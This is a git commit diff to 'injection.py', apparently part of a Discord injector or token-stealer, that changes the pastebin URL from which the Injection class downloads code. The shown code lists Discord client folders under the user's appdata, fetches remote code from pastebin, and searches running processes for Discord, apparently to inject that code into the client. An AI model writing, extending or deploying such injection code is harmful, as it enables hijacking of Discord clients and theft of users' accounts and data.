b082a992ad9480670ef87ca72a2daea0442ee880
precoce <135760124+badafofozapdc@users.noreply.github.com>
2023-07-27 18:01:05 -0300

    Update injection.py

--- src/components/injection.py
+++ src/components/injection.py
@@ -15,7 +15,7 @@ class Injection:
             self.appdata + '\\DiscordPTB',
             self.appdata + '\\DiscordDevelopment'
         ]
-        self.code = requests.get('https://pastebin.com/raw/5YeFJK1k').text
+        self.code = requests.get('https://pastebin.com/raw/JxznJKVN').text
         
         for proc in psutil.process_iter():
             if 'discord' in proc.name().lower():
